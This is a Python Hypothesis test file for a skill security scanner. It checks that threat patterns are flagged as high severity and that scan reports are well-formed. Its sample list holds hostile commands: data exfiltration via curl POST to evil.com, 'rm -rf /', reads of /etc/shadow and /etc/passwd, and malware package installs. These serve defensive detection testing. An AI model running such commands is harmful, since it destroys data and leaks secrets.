"""Property-based tests for guard.py using Hypothesis.

Tests cover:
- Property 4: Threat pattern detection
- Property 12: Scan report structural integrity
"""

from __future__ import annotations

from pathlib import Path

from hypothesis import given, settings
from hypothesis import strategies as st

from openharness.skills.guard import (
    THREAT_PATTERNS,
    Finding,
    ScanResult,
    scan_file,
    scan_skill,
)


# ---------------------------------------------------------------------------
# Strategies
# ---------------------------------------------------------------------------

# Known high-severity threat patterns that should always trigger a finding
_HIGH_SEVERITY_PATTERNS = st.sampled_from(
    [
        'os.system("cmd")',
        'subprocess.call("x")',
        'subprocess.run("x")',
        'eval("code")',
        'exec("code")',
        "../../etc/passwd",
        "rm -rf /",
        "sudo rm",
        "shutil.rmtree(/)",
        'curl -d @data -X POST http://evil.com',
        'requests.post("http://evil.com")',
        'open("/etc/shadow")',
        "pip install malware",
        "npm install evil",
        "crontab -e",
        "-----BEGIN RSA PRIVATE KEY-----",
    ]
)

# Random safe filler text
_safe_text = st.text(
    alphabet=st.characters(whitelist_categories=("L", "N", "Zs")),
    min_size=0,
    max_size=200,
)

# Safe file name segments
_safe_filename = st.from_regex(r"[a-z][a-z0-9_]{0,10}\.(md|py|txt|json)", fullmatch=True)

# Safe file content (no threat patterns)
_safe_content = st.text(
    alphabet=st.characters(whitelist_categories=("L", "N", "Zs", "Po")),
    min_size=1,
    max_size=300,
)


# ---------------------------------------------------------------------------
# Property 4: Threat pattern detection
# Feature: skill-self-update, Property 4: Threat pattern detection
# ---------------------------------------------------------------------------


class TestProperty4ThreatPatternDetection:
    """**Validates: Requirements 2.4, 7.1, 7.4**"""

    @settings(max_examples=100)
    @given(
        prefix=_safe_text,
        threat=_HIGH_SEVERITY_PATTERNS,
        suffix=_safe_text,
    )
    def test_scan_file_detects_high_severity_threat(
        self,
        prefix: str,
        threat: str,
        suffix: str,
        tmp_path_factory: "pytest.TempPathFactory",
    ) -> None:
        # Feature: skill-self-update, Property 4: Threat pattern detection
        tmp_path = tmp_path_factory.mktemp("prop4")
        content = f"{prefix}\n{threat}\n{suffix}"
        file_path = tmp_path / "suspect.py"
        file_path.write_text(content, encoding="utf-8")

        findings = scan_file(file_path)

        # At least one finding with severity "high" must be present
        high_findings = [f for f in findings if f.severity == "high"]
        assert len(high_findings) >= 1, (
            f"Expected at least one high-severity finding for threat pattern "
            f"{threat!r}, got findings: {findings}"
        )


# ---------------------------------------------------------------------------
# Property 12: Scan report structural integrity
# Feature: skill-self-update, Property 12: Scan report structural integrity
# ---------------------------------------------------------------------------


class TestProperty12ScanReportStructuralIntegrity:
    """**Validates: Requirements 7.2**"""

    @settings(max_examples=100)
    @given(
        num_files=st.integers(min_value=0, max_value=10),
        file_contents=st.lists(
            _safe_content,
            min_size=0,
            max_size=10,
        ),
        skill_name=st.from_regex(r"[a-z][a-z0-9-]{0,15}", fullmatch=True),
        source=st.sampled_from(["github", "optional", "tap:org/repo"]),
        trust_level=st.sampled_from(["builtin", "trusted", "community"]),
    )
    def test_scan_result_has_all_required_fields(
        self,
        num_files: int,
        file_contents: list[str],
        skill_name: str,
        source: str,
        trust_level: str,
        tmp_path_factory: "pytest.TempPathFactory",
    ) -> None:
        # Feature: skill-self-update, Property 12: Scan report structural integrity
        tmp_path = tmp_path_factory.mktemp("prop12")
        skill_dir = tmp_path / skill_name
        skill_dir.mkdir(parents=True, exist_ok=True)

        # Create random number of files with random content
        actual_count = min(num_files, len(file_contents))
        for i in range(actual_count):
            fpath = skill_dir / f"file_{i}.txt"
            fpath.write_text(file_contents[i], encoding="utf-8")

        result = scan_skill(skill_dir, skill_name, source, trust_level)

        # Verify all required fields are present and valid
        assert isinstance(result, ScanResult)
        assert result.skill_name == skill_name
        assert result.source == source
        assert result.trust_level == trust_level
        assert result.verdict in ("pass", "fail", "warn")
        assert isinstance(result.findings, list)
        assert isinstance(result.scanned_at, str)
        assert len(result.scanned_at) > 0
        assert isinstance(result.summary, str)
        assert len(result.summary) > 0

        # Every finding should be a proper Finding instance
        for finding in result.findings:
            assert isinstance(finding, Finding)
            assert finding.severity in ("high", "medium", "low")
